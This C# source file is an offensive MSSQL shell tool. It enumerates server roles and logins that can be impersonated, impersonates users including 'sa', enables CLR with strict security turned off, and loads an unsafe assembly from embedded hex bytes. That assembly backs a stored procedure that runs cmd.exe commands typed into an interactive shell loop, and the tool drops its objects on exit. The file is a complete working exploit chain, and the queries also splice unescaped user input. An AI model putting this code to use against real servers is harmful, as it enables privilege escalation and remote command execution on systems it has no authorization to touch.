using System;
using System.IO;
using System.Linq;
using System.Text;
using System.Data.SqlClient;
using System.Threading.Tasks;
using System.Collections.Generic;

namespace SqlSpShell
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.Write("[*] Enter target sql server: ");
            String sqlServer = Console.ReadLine();
            Console.Write("[*] Enter target database: ");
            String sqlDatabase = Console.ReadLine();
            String sqlConn = $"Server = {sqlServer}; Database = {sqlDatabase}; Integrated Security = True;";
            SqlConnection conn = new SqlConnection(sqlConn);

            try
            {
                conn.Open();
                Console.WriteLine("[+] Authentication successful");
            }
            catch
            {
                Console.WriteLine("[-] Authentication failure");
                Environment.Exit(0);
            }

            Console.WriteLine("[!] Checking user privileges");
            String user = "select system_user;";
            SqlCommand cmd = new SqlCommand(user, conn);
            SqlDataReader read = cmd.ExecuteReader();
            read.Read();
            Console.WriteLine($"[+] Mapped to user: {read[0]}");
            read.Close();

            String pub = "select is_srvrolemember('public');";
            cmd = new SqlCommand(pub, conn);
            read = cmd.ExecuteReader();
            read.Read();
            Int32 role = Int32.Parse(read[0].ToString());

            if (role == 1)
            {
                Console.WriteLine("[+] User is a member of public role");
            }
            else
            {
                Console.WriteLine("[-] User is NOT a member of public role");
            }
            read.Close();

            String adm = "select is_srvrolemember('sysadmin');";
            cmd = new SqlCommand(adm, conn);
            read = cmd.ExecuteReader();
            read.Read();
            role = Int32.Parse(read[0].ToString());

            if (role == 1)
            {
                Console.WriteLine("[+] User is a sysadmin");
            }
            else
            {
                Console.WriteLine("[-] User is NOT a sysadmin");
            }
            read.Close();

            Console.WriteLine("[!] Checking for user impersonation");
            String query = "select distinct b.name from sys.server_permissions a inner join sys.server_principals b on a.grantor_principal_id = b.principal_id where a.permission_name = 'impersonate';";
            cmd = new SqlCommand(query, conn);
            read = cmd.ExecuteReader();

            while (read.Read() == true)
            {
                Console.WriteLine($"[+] {read[0]} can be impersonated");
            }
            read.Close();

            Console.Write("[*] Would you like to attempt impersonation? [y/n]: ");
            String answer = Console.ReadLine();

            if (answer.ToLower() == "y")
            {
                try
                {
                    Console.Write("[*] Enter user to impersonate: ");
                    String target = Console.ReadLine();
                    Console.WriteLine($"[!] Attempting to impersonate {target}");
                    String runas = $"use msdb; execute as user = '{target}';";
                    cmd = new SqlCommand(runas, conn);
                    read = cmd.ExecuteReader();
                    read.Close();
                    Console.WriteLine("[+] Impersonation success!");
                    String check = "select system_user;";
                    cmd = new SqlCommand(check, conn);
                    read = cmd.ExecuteReader();
                    read.Read();
                    Console.WriteLine($"[+] Current user: {read[0]}");
                    read.Close();

                    Console.Write("[*] Would you like to attempt to enable stored procedure? [y/n]: ");
                    answer = Console.ReadLine();

                    if (answer.ToLower() == "y")
                    {
                        String cwd = Directory.GetCurrentDirectory();
                        Console.WriteLine("[!] Attempting to enable stored procedure");

                        String impersonate = "execute as login = 'sa';";
                        cmd = new SqlCommand(impersonate, conn);
                        read = cmd.ExecuteReader();
                        read.Close();

                        String enableOpts = "use msdb; exec sp_configure 'show advanced options', 1; reconfigure; exec sp_configure 'clr enabled', 1; reconfigure; exec sp_configure 'clr strict security', 0; reconfigure;";
                        cmd = new SqlCommand(enableOpts, conn);
                        read = cmd.ExecuteReader();
                        read.Close();

                        String createAssem = "create assembly myAssembly from 0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A24000000000000005045000064860200BE3C68D30000000000000000F00022200B023000000C000000040000000000000000000000200000000000800100000000200000000200000400000000000000060000000000000000600000000200000000000003006085000040000000000000400000000000000000100000000000002000000000000000000000100000000000000000000000000000000000000000400000C80300000000000000000000000000000000000000000000000000000C2A0000380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000004800000000000000000000002E74657874000000C20A000000200000000C000000020000000000000000000000000000200000602E72737263000000C80300000040000000040000000E00000000000000000000000000004000004000000000000000000000000000000000000000000000000000000000000000000000000000000000480000000200050014210000F8080000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000013300600B500000001000011731000000A0A066F1100000A72010000706F1200000A066F1100000A7239000070028C12000001281300000A6F1400000A066F1100000A166F1500000A066F1100000A176F1600000A066F1700000A26178D17000001251672490000701F0C20A00F00006A731800000AA2731900000A0B281A00000A076F1B00000A0716066F1C00000A6F1D00000A6F1E00000A6F1F00000A281A00000A076F2000000A281A00000A6F2100000A066F2200000A066F2300000A2A1E02282400000A2A00000042534A4201000100000000000C00000076342E302E33303331390000000005006C000000B8020000237E0000240300001004000023537472696E6773000000003407000058000000235553008C0700001000000023475549440000009C0700005C01000023426C6F620000000000000002000001471502000900000000FA013300160000010000001C000000020000000200000001000000240000000F000000010000000100000003000000000077020100000000000600A101310306000E0231030600BF00FF020F00510300000600E70095020600840195020600650195020600F50195020600C10195020600DA0195020600140195020600D30012030600B100120306004801950206002F0140020600A3038E020A00FE00DE020A005A0260030E008603FF020A006200DE020E00B502FF02060070028E020A002000DE020A008E0014000A00F503DE020A008600DE020600C6020A000600D3020A000000000001000000000001000100010010007503000041000100010048200000000096003500620001000921000000008618F902060002000000010056000900F90201001100F90206001900F9020A002900F90210003100F90210003900F90210004100F90210004900F90210005100F90210005900F90210006100F90215006900F90210007100F90210007900F90210008900F90206009900F90206009900A7022100A90070001000B1009C032600A9008E031000A9002C021500A900DA0315009900C1032C00B900F9023000A100F9023800C9007D003F00D100B60344009900C7034A00E1003D004F00810064024F00A1006D025300D10000044400D100470006009900AA0306009900AB0006008100F902060020007B0054012E000B0068002E00130071002E001B0090002E00230099002E002B00B1002E003300B1002E003B00B1002E00430099002E004B00B7002E005300B1002E005B00B1002E006300CF002E006B00F9002E00730006011A000480000001000000000000000000000000009800000004000000000000000000000059002C0000000000040000000000000000000000590014000000000004000000000000000000000059008E02000000000000003C4D6F64756C653E0053797374656D2E494F0053797374656D2E446174610053716C4D65746144617461006D73636F726C696200636D64457865630052656164546F456E640053656E64526573756C7473456E640065786563436F6D6D616E640053716C446174615265636F7264007365745F46696C654E616D65006765745F506970650053716C506970650053716C4462547970650053716C53746F72656450726F63656475726500436C6F736500477569644174747269627574650044656275676761626C6541747472696275746500436F6D56697369626C6541747472696275746500417373656D626C795469746C654174747269627574650053716C50726F63656475726541747472696275746500417373656D626C7954726164656D61726B417474726962757465005461726765744672616D65776F726B41747472696275746500417373656D626C7946696C6556657273696F6E41747472696275746500417373656D626C79436F6E66696775726174696F6E41747472696275746500417373656D626C794465736372697074696F6E41747472696275746500436F6D70696C6174696F6E52656C61786174696F6E7341747472696275746500417373656D626C7950726F6475637441747472696275746500417373656D626C79436F7079726967687441747472696275746500417373656D626C79436F6D70616E794174747269627574650052756E74696D65436F6D7061746962696C697479417474726962757465007365745F5573655368656C6C457865637574650053797374656D2E52756E74696D652E56657273696F6E696E670053716C537472696E6700546F537472696E6700536574537472696E670053716C53746F72656450726F6365647572652E646C6C0053797374656D0053797374656D2E5265666C656374696F6E006765745F5374617274496E666F0050726F636573735374617274496E666F0053747265616D5265616465720054657874526561646572004D6963726F736F66742E53716C5365727665722E536572766572002E63746F720053797374656D2E446961676E6F73746963730053797374656D2E52756E74696D652E496E7465726F7053657276696365730053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300446562756767696E674D6F6465730053797374656D2E446174612E53716C54797065730053746F72656450726F636564757265730050726F63657373007365745F417267756D656E747300466F726D6174004F626A6563740057616974466F72457869740053656E64526573756C74735374617274006765745F5374616E646172644F7574707574007365745F52656469726563745374616E646172644F75747075740053716C436F6E746578740053656E64526573756C7473526F770000003743003A005C00570069006E0064006F00770073005C00530079007300740065006D00330032005C0063006D0064002E00650078006500000F20002F00430020007B0030007D00000D6F00750074007000750074000000858CA29469FFFE4DA09ED03FB58F1B5A00042001010803200001052001011111042001010E0420010102060702124D125104200012550500020E0E1C03200002072003010E11610A062001011D125D0400001269052001011251042000126D0320000E05200201080E08B77A5C561934E0890500010111490801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F7773010801000200000000001701001253716C53746F72656450726F636564757265000005010000000017010012436F7079726967687420C2A920203230323200002901002466343631613338652D633665332D346539632D393733632D65636161626438346637653500000C010007312E302E302E3000004D01001C2E4E45544672616D65776F726B2C56657273696F6E3D76342E372E320100540E144672616D65776F726B446973706C61794E616D65142E4E4554204672616D65776F726B20342E372E32040100000000000000000000BC2655BE00000000020000007E000000442A0000440C00000000000000000000000000001000000000000000000000000000000052534453335B1B1CACF9CD49B79D0AECF46D5049010000005C5C3139322E3136382E34392E3137365C76697375616C73747564696F5C746F6F6C6B69742D66696E616C5C53716C53746F72656450726F6365647572655C6F626A5C7836345C52656C656173655C53716C53746F72656450726F6365647572652E70646200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001001000000018000080000000000000000000000000000001000100000030000080000000000000000000000000000001000000000048000000584000006C03000000000000000000006C0334000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000001000000000000000100000000003F000000000000000400000002000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B004CC020000010053007400720069006E006700460069006C00650049006E0066006F000000A802000001003000300030003000300034006200300000001A000100010043006F006D006D0065006E007400730000000000000022000100010043006F006D00700061006E0079004E0061006D00650000000000000000004E0013000100460069006C0065004400650073006300720069007000740069006F006E0000000000530071006C00530074006F00720065006400500072006F0063006500640075007200650000000000300008000100460069006C006500560065007200730069006F006E000000000031002E0030002E0030002E00300000004E001700010049006E007400650072006E0061006C004E0061006D0065000000530071006C00530074006F00720065006400500072006F006300650064007500720065002E0064006C006C00000000004800120001004C006500670061006C0043006F007000790072006900670068007400000043006F0070007900720069006700680074002000A90020002000320030003200320000002A00010001004C006500670061006C00540072006100640065006D00610072006B00730000000000000000005600170001004F0072006900670069006E0061006C00460069006C0065006E0061006D0065000000530071006C00530074006F00720065006400500072006F006300650064007500720065002E0064006C006C0000000000460013000100500072006F0064007500630074004E0061006D00650000000000530071006C00530074006F00720065006400500072006F0063006500640075007200650000000000340008000100500072006F006400750063007400560065007200730069006F006E00000031002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000031002E0030002E0030002E0030000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 with permission_set = unsafe;";
                        cmd = new SqlCommand(createAssem, conn);
                        read = cmd.ExecuteReader();
                        read.Close();

                        Console.WriteLine("[+] Entering new shell session");
                        Console.Write($"\nMSSQL {cwd}> ");
                        String command = Console.ReadLine();
                        String execCmd = $"exec cmdExec '{command}';";
                        String createProc = "create procedure [dbo].[cmdExec] @execCmd nvarchar (4000) as external name [myAssembly].[StoredProcedures].[cmdExec]";
                        
                        cmd = new SqlCommand(createProc, conn);
                        read = cmd.ExecuteReader();
                        read.Close();

                        cmd = new SqlCommand(execCmd, conn);
                        read = cmd.ExecuteReader();
                        read.Read();
                        Console.WriteLine($"{read[0]}");
                        read.Close();

                        while (true)
                        {
                            Console.Write($"MSSQL {cwd}> ");
                            command = Console.ReadLine();
                            execCmd = $"exec cmdExec '{command}';";
                            cmd = new SqlCommand(execCmd, conn);
                            read = cmd.ExecuteReader();
                            read.Read();
                            Console.WriteLine($"{read[0]}");
                            read.Close();

                            if (String.Equals(command, "exit"))
                            {
                                impersonate = "use msdb; execute as user = 'dbo';";
                                cmd = new SqlCommand(impersonate, conn);
                                read = cmd.ExecuteReader();
                                read.Close();

                                String dropProc = "drop procedure cmdExec;";
                                cmd = new SqlCommand(dropProc, conn);
                                read = cmd.ExecuteReader();
                                read.Close();

                                String dropAssem = "drop assembly myAssembly;";
                                cmd = new SqlCommand(dropAssem, conn);
                                read = cmd.ExecuteReader();
                                read.Close();

                                conn.Close();

                                Console.Clear();
                                break;
                            }
                        }
                        conn.Close();
                    }
                    else if (answer.ToLower() == "n")
                    {
                        conn.Close();
                        Environment.Exit(0);
                    }
                    else
                    {
                        Console.WriteLine("[-] Invalid selection!");
                        conn.Close();
                        Environment.Exit(0);
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine(e.ToString());
                }
            }
            else if (answer.ToLower() == "n")
            {
                conn.Close();
                Environment.Exit(0);
            }
            else
            {
                Console.WriteLine("[-] Invalid selection!");
                conn.Close();
                Environment.Exit(0);
            }
            conn.Close();
        }
    }
}